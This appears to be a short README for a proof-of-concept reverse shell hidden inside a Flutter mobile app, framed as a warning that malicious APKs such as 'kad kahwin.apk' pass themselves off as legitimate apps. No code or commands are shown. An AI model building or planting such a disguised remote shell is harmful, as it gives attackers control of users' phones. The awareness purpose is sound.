# POC Reverse Shell With Flutter Application

Iâ€™m sharing a proof of concept demonstrating how a reverse shell can be implemented within a Flutter application. This is a reminder to always download apps only from trusted sources. Malicious APKs can easily disguise themselves as legitimate apps, like "kad kahwin.apk."

I built this example app entirely in Flutter to show how vulnerabilities can appear even in custom applications, highlighting the need for caution when installing software.
